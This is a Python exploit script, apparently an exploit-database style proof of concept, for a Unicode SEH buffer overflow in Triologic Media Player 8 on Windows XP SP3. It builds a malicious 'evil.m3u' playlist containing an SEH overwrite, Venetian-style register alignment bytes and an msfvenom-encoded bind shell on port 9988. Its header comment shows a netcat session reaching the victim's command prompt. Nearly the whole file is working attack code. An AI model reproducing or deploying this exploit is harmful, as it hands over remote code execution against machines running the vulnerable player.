#!/usr/bin/python3

#-------------------------------------------------------------------------------#
# Exploit: Triologic Media Player 8 (Unicode SEH)                               #
# OS: Windows XP Professional SP3 Build 2600                                    #
# Architecture: x86                                                             #
#-------------------------------------------------------------------------------#
# $ nc -nv 192.168.1.82 9988                                                    #
# (UNKNOWN) [192.168.1.82] 9988 (?) open                                        #
# Microsoft Windows XP [Version 5.1.2600]                                       #
# (C) Copyright 1985-2001 Microsoft Corp.                                       #
#                                                                               #
# Z:\unicode>                                                                   #
#-------------------------------------------------------------------------------#

filename = "evil.m3u"

# nSEH => \x41\x71 => 41        INC ECX
#                     0071 00   ADD BYTE PTR DS:[ECX],DH
# SEH  => \xF2\x41 => F2:       PREFIX REPNE:
#                     0041 00   ADD BYTE PTR DS:[ECX],AL
# 0x004100f2 : pop esi # pop ebx # ret 04 | triomp8.exe
SEH = b"\x41\x71" + b"\xF2\x41"

# Alignment with EBP register using Venetian black magic alignment
align = (
b"\x55"               # Push the value of EBP on to the stack
b"\x71"               # Venetian Padding
b"\x58"               # Take the value of EBP and pop it into EAX
b"\x71"               # Venetian Padding
b"\x05\x20\x11"       # Add eax,0x11002000  \
b"\x71"               # Venetian Padding     |> the net sum will add 300 to the value in EAX
b"\x2d\x17\x11"       # Sub eax,0x11001700  /
b"\x71"               # Venetian Padding
b"\x50"               # Push the new value of EAX onto the stack (points to our buffer)
b"\x71"               # Venetian Padding
b"\xC3"               # Redirect execution flow to the pointer at the top of the stack ==> EAX
)

# Padding to align buffer with EAX register
filler = b"\x58"*117

# msfvenom -p windows/shell_bind_tcp LPORT=9988 -e x86/unicode_upper BufferRegister=EAX
# x86/unicode_upper succeeded with size 787 (iteration=0)
shellcode = b"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLIX4BM0KPM0304IYU01I01TDK0PP04KQBLL4KPRLT4K3BMXLO87PJO6NQKOVLOLQQSLKRNLO0WQHOLMM1Y7K2ZR1B1GTKPRLPTK0JOLTK0LLQ2X9SOXKQXQPQ4KQIO0KQ8S4K0IMHK3OJOY4KNTTKM1IFNQKOFLY1HOLMKQI7OHK0CEKFKSCMKHOKCMMTRUZD1HTK28NDM1ICQVTKLL0KTKQHMLKQYCDKM4DKM1J0U9PDNDO4QKQKC10YPZPQKOK0QO1O0ZDKN2ZKDM1MC803OBM0KP2H47BS02QO24S80LBWNFKWKOHUFX60KQM0M0O9Y424PPS8MY3P2KKPKOHU1ZKX0YB09RKM10B0Q0PP38JJLO9O9PKOJ5UG2HLBKPMWM4DIIV1ZLPB6QGBHWRYKOGRGKOIE2738VW9Y08KOKOYEB71XD4JLOK9QKOXUPWDWRH3ERNPM31KOHUBHC3BMRDM0SYK3R7B70WNQZVQZN2PY269RKM1VHG14NDOLM1KQDMQ4NDN0Y6KPPDR4R0PV260V16QF0NR62623R6QXD9HLOO56KOXUSYK0PN26Q6KOP0QXM8U7MMQPKOHUGKZP7EVB1FRH76UE7MEMKOYEOLKV3LKZU0KKIPT5LEGKQ7LSCBBO2JKP0SKO8UAA"

payload = SEH + align + filler + shellcode
buffer = b"\x90"*536 + payload + b"B"*(4466-len(payload))

textfile = open(filename, "wb")
textfile.write(buffer)
textfile.close()

